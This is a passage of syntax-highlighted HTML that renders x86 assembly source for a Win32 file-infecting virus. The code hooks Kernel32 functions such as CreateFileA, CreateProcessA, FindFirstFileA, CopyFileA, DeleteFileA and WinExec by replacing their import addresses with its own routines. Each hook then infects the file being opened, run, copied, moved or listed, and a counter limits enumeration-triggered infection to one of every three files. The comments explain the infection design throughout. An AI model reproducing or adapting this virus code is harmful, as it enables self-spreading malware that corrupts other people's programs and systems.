                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetProcAddress</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                                              </span><span class="sc1">; EDI=End address of functions          </span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc5">@@Loop_GPA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">            </span><span class="sc1">; Load first RVA</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; Compare the kernel returned RVA</span><span class="sc0">
                                         </span><span class="sc1">; with the RVA that we got scanning</span><span class="sc0">
                                         </span><span class="sc1">; the kernel at first</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Next_GPA</span><span class="sc0"> </span><span class="sc1">; If it isn't equal, jump</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Put in ESI the address of the per-</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc1">; process function</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FunctionsAddress</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Load it</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Substitute RVA to function</span><span class="sc0">
                                               </span><span class="sc1">; by our function address</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return2</span><span class="sc0">  </span><span class="sc1">; End</span><span class="sc0">
           </span><span class="sc5">@@Next_GPA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Already at the end of the array?</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop_GPA</span><span class="sc0"> </span><span class="sc1">; If not, loop</span><span class="sc0">
            </span><span class="sc5">@@Return2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">            </span><span class="sc1">; Restore registers</span><span class="sc0">
            </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc1">;Return to host with the substituted RVA (if done)</span><span class="sc0">
</span><span class="sc5">My_GetProcAddress</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; CreateFileA: Infection on opening</span><span class="sc0">
</span><span class="sc5">My_CreateFileA</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">  </span><span class="sc1">; EAX=Delta offset</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_CreateFileA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EAX=RVA to func.</span><span class="sc0">
                    </span><span class="sc1">;    jmp     InfectByPerProcess    ; Jump to common part</span><span class="sc0">
</span><span class="sc5">My_CreateFileA</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">InfectByPerProcess</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Save RVA to function</span><span class="sc0">
                        </span><span class="sc6">pushad</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; EBP=Delta offset</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EBX=RVA to the name of the</span><span class="sc0">
                                               </span><span class="sc1">; file to operate</span><span class="sc0">
</span><span class="sc5">InfectThisPath</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileField</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EAX=RVA to data</span><span class="sc0">
                                                         </span><span class="sc1">; storage</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Store it to use FindFirstFile</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">   </span><span class="sc1">; Store the RVA to the name of the file</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FindFirstFileA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Find it</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0"> </span><span class="sc1">; If error (not found), return</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileName</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                 </span><span class="sc5">@@LoopCopy</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">movsb</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopCopy</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Save handle</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc0">  </span><span class="sc1">; Infect that file using the data</span><span class="sc0">
                                            </span><span class="sc1">; in FindFileField</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FindClose</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Close the</span><span class="sc0">
                                                              </span><span class="sc1">; pushed handle</span><span class="sc0">
         </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">popad</span><span class="sc0">    </span><span class="sc1">; Restore regs</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">      </span><span class="sc1">; Jump to kernel function</span><span class="sc0">
</span><span class="sc5">InfectByPerProcess</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">InfectDirectly</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">pushad</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectThisPath</span><span class="sc0">
</span><span class="sc5">InfectDirectly</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; CreateProcessA: Infection on execution</span><span class="sc0">
</span><span class="sc5">My_CreateProcessA</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0"> 
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_CreateProcessA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectByPerProcess</span><span class="sc0">
</span><span class="sc5">My_CreateProcessA</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">             </span><span class="sc1">; EAX=RVA to Kernel32.CreateProcessA</span><span class="sc0">

</span><span class="sc5">FindFirstIdent</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; This is used to identify FindFirstFileA or</span><span class="sc0">
                          </span><span class="sc1">; FindNextFileA</span><span class="sc0">

</span><span class="sc1">; FindNextFileA: Infection by file enumeration</span><span class="sc0">
</span><span class="sc5">My_FindNextFileA</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">  </span><span class="sc1">; EAX=Delta offset</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">FindFirstIdent</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Common_FindFile</span><span class="sc0"> 
</span><span class="sc5">My_FindNextFileA</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">My_FindFirstFileA</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">  </span><span class="sc1">; EAX=Delta offset</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">FindFirstIdent</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc5">Common_FindFile</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@ReturnHere</span><span class="sc0"> </span><span class="sc1">; EAX=Return address</span><span class="sc0">
                                          </span><span class="sc1">; for calling the KERNEL32 function</span><span class="sc0">
                                          </span><span class="sc1">; and returning here and not to the</span><span class="sc0">
                                          </span><span class="sc1">; host</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; Save ECX</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; ECX=Return address</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Set it onto stack and EAX is</span><span class="sc0">
                                              </span><span class="sc1">; now the return address to the</span><span class="sc0">
                                              </span><span class="sc1">; host</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Save it in @@ReturnHere+1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; We put the buffer address...</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; ...here</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; We restore ECX</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0"> </span><span class="sc1">; EAX = Delta offset</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">FindFirstIdent</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PutFindFirst</span><span class="sc0">   </span><span class="sc1">; If =1, call to FindFirstFileA</span><span class="sc0">
       </span><span class="sc5">@@PutFindNext</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_FindNextFileA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Call FindNextFileA</span><span class="sc0">
       </span><span class="sc5">@@PutFindFirst</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Call FindFirstFileA</span><span class="sc0">
        </span><span class="sc5">@@ReturnHere</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0"> </span><span class="sc1">; PUSH Value</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; +1</span><span class="sc0">
                        </span><span class="sc6">pushad</span><span class="sc0">           </span><span class="sc1">; +5  ; Save registers</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; +6  ; Error?</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsOK</span><span class="sc0">    </span><span class="sc1">; +7  ; If not, jump</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; +9  ; Restore EAX</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">   </span><span class="sc1">; +A  ; Return to host</span><span class="sc0">
          </span><span class="sc5">@@ItsOK</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BEh</span><span class="sc0"> </span><span class="sc1">; MOV ESI,Value   ; +C ; ESI=Address to</span><span class="sc0">
          </span><span class="sc5">@@ESIValue</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; +D ;     data field</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; EBP=Delta offset</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileField</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EDI=Our data field</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FindFileFieldSize</span><span class="sc0"> </span><span class="sc1">; Copy the data retrie-</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">                      </span><span class="sc1">; ved by the function to our</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">            </span><span class="sc1">; data field</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfectFileNow</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Decrease infec-</span><span class="sc0">
                                                        </span><span class="sc1">; tion counter</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">           </span><span class="sc1">; If it's not 0, don't infect</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfectFileNow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; Set this to</span><span class="sc0">
                                                 </span><span class="sc1">; 3, to infect only one of</span><span class="sc0">
                                                 </span><span class="sc1">; every three files listed by</span><span class="sc0">
                                                 </span><span class="sc1">; this function</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc0">    </span><span class="sc1">; Infect file</span><span class="sc0">
              </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Restore regs and return</span><span class="sc0">
</span><span class="sc5">My_FindFirstFileA</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">InfectFileNow</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">  </span><span class="sc1">; Infection counter</span><span class="sc0">

</span><span class="sc1">; GetFileAttributesA: Infection by getting attributes</span><span class="sc0">
</span><span class="sc5">My_GetFileAttributesA</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_GetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectByPerProcess</span><span class="sc0">
</span><span class="sc5">My_GetFileAttributesA</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">         </span><span class="sc1">; EAX=RVA to Kernel32.GetFileAttributesA</span><span class="sc0">

</span><span class="sc1">; SetFileAttributesA: Infection by setting attributes</span><span class="sc0">
</span><span class="sc5">My_SetFileAttributesA</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectByPerProcess</span><span class="sc0">
</span><span class="sc5">My_SetFileAttributesA</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">         </span><span class="sc1">; EAX=RVA to Kernel32.SetFileAttributesA</span><span class="sc0">

</span><span class="sc1">; GetFullPathNameA: Infection by getting the full path name of a file</span><span class="sc0">
</span><span class="sc5">My_GetFullPathNameA</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_GetFullPathNameA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectByPerProcess</span><span class="sc0">
</span><span class="sc5">My_GetFullPathNameA</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">         </span><span class="sc1">; EAX=RVA to Kernel32.GetFullPathNameA</span><span class="sc0">

</span><span class="sc1">; MoveFileA: Infection by moving a file</span><span class="sc0">
</span><span class="sc5">My_MoveFileA</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_MoveFileA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectByPerProcess</span><span class="sc0">
</span><span class="sc5">My_MoveFileA</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">         </span><span class="sc1">; EAX=RVA to Kernel32.MoveFileA</span><span class="sc0">

</span><span class="sc1">; CopyFileA: Infection by copying a file</span><span class="sc0">
</span><span class="sc5">My_CopyFileA</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_CopyFileA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectByPerProcess</span><span class="sc0">
</span><span class="sc5">My_CopyFileA</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">         </span><span class="sc1">; EAX=RVA to Kernel32.CopyFileA</span><span class="sc0">

</span><span class="sc1">; DeleteFileA: Infection by deleting a file.</span><span class="sc0">
</span><span class="sc1">; Although it could seem stupid, remember the Recycle Bin!</span><span class="sc0">
</span><span class="sc5">My_DeleteFileA</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_DeleteFileA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectByPerProcess</span><span class="sc0">
</span><span class="sc5">My_DeleteFileA</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">         </span><span class="sc1">; EAX=RVA to Kernel32.DeleteFileA</span><span class="sc0">

</span><span class="sc1">; WinExec: Infection by execution (old Win32, for compatibility with Win16)</span><span class="sc0">
</span><span class="sc5">My_WinExec</span><span class="sc0">              </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_WinExec</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectByPerProcess</span><span class="sc0">
</span><span class="sc5">My_WinExec</span><span class="sc0">              </span><span class="sc9">endp</span><span class="sc0">         </span><span class="sc1">; EAX=RVA to Kernel32.WinExec</span><span class="sc0">

</span><span class="sc1">; _lopen: Infection by opening (old Win32, for compatibility with Win16)</span><span class="sc0">
</span><span class="sc5">My__lopen</span><span class="sc0">               </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA__lopen</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectByPerProcess</span><span class="sc0">
</span><span class="sc5">My__lopen</span><span class="sc0">               </span><span class="sc9">endp</span><span class="sc0">         </span><span class="sc1">; EAX=RVA to Kernel32._lopen</span><span class="sc0">

</span><span class="sc1">; MoveFileExA: Infection by moving (extended, but the same as MoveFileA)</span><span class="sc0">
</span><span class="sc5">My_MoveFileExA</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_MoveFileExA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectByPerProcess</span><span class="sc0">
</span><span class="sc5">My_MoveFileExA</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">         </span><span class="sc1">; EAX=RVA to Kernel32.MoveFileExA</span><span class="sc0">

</span><span class="sc1">; OpenFile: Infection by opening (old Win32, earlier than CreateFileA)</span><span class="sc0">
</span><span class="sc5">My_OpenFile</span><span class="sc0">             </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_OpenFile</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectByPerProcess</span><span class="sc0">
</span><span class="sc5">My_OpenFile</span><span class="sc0">             </span><span class="sc9">endp</span><span class="sc0">         </span><span class="sc1">; EAX=RVA to Kernel32.OpenFile</span><span class="sc0">

